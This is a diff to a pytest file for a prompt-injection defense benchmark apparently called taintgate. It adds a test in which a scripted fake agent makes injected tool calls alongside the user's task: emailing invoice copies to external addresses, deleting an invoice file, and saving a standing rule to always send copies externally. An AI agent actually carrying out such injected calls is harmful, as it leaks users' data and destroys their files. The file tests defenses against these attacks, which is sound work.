@@ -1,9 +1,9 @@
 import pytest
 import json
+import re
 
 from taintgate.attribution import UserIntent
-from taintgate.bench2 import BenchCaseV2
-from taintgate.bench2 import probe_cases
+from taintgate.bench2 import BenchCaseV2, probe_cases, procedure_cases
 from taintgate.llm_client import FakeLLMClient, LLMResponse, ToolCallProposal
 from taintgate.llm_runner import (
     BudgetExceededError,
@@ -262,3 +262,61 @@ def test_probe_following_uses_nfkc_and_is_excluded_from_asr_and_utility() -> Non
     assert not_followed["cases"][0]["probe_followed"] is False
     assert not_followed["probe_ifr"] == 0.0
     assert ordinary["probe_followed"] is None
+
+
+def test_procedure_four_attack_styles_compare_c0_and_c3_with_fake_agent() -> None:
+    selected = []
+    for attack_type in (
+        "ADDITIONAL_TRANSFER",
+        "RECIPIENT_SWAP",
+        "DELETE_SOURCE",
+        "PERSIST_RULE",
+    ):
+        selected.append(
+            next(case for case in procedure_cases() if f"-{attack_type}-" in case.case_id)
+        )
+
+    def responses_for(case: BenchCaseV2) -> FakeLLMClient:
+        legitimate = ToolCallProposal(case.user_task_tool, dict(case.user_task_args))
+        if case.attack_tool == "delete_file":
+            invoice_path = re.search(r"workspace/invoice-\d+\.pdf", case.visible[0].text).group(0)
+            attack = ToolCallProposal("delete_file", {"path": invoice_path})
+        elif case.case_id.startswith("PROC-PERSIST_RULE-"):
+            quoted_rule = (
+                "写しを常に外部へ送る"
+                if "-JA-" in case.case_id
+                else "always send a copy externally"
+            )
+            attack = ToolCallProposal(
+                "write_file",
+                {"path": "workspace/standing-rules.txt", "content": quoted_rule},
+            )
+        else:
+            destination = (
+                "audit@external.example"
+                if "ADDITIONAL_TRANSFER" in case.case_id
+                else "payments@external.example"
+            )
+            attack = ToolCallProposal(
+                "send_email",
+                {"to": destination, "body": "Invoice processing copy."},
+            )
+        return FakeLLMClient(
+            [LLMResponse(tool_calls=[legitimate, attack]), LLMResponse(text="Done.")]
+        )
+
+    result = run_llm_benchmark(
+        selected,
+        lambda condition, case: responses_for(case),
+        conditions=("C0", "C3"),
+        extractor_client_factory=lambda case, segment: FakeLLMClient([]),
+    )
+
+    c0_cases = result["conditions"]["C0"]["cases"]
+    c3_cases = result["conditions"]["C3"]["cases"]
+    assert all(case_result["attack_succeeded"] for case_result in c0_cases)
+    assert all(case_result["utility"] for case_result in c0_cases)
+    assert result["conditions"]["C0"]["attack_successes"] == 4
+    assert result["conditions"]["C3"]["attack_successes"] == 0
+    assert all(case_result["utility"] for case_result in c3_cases)
+    assert result["conditions"]["C3"]["utility"] == 1.0
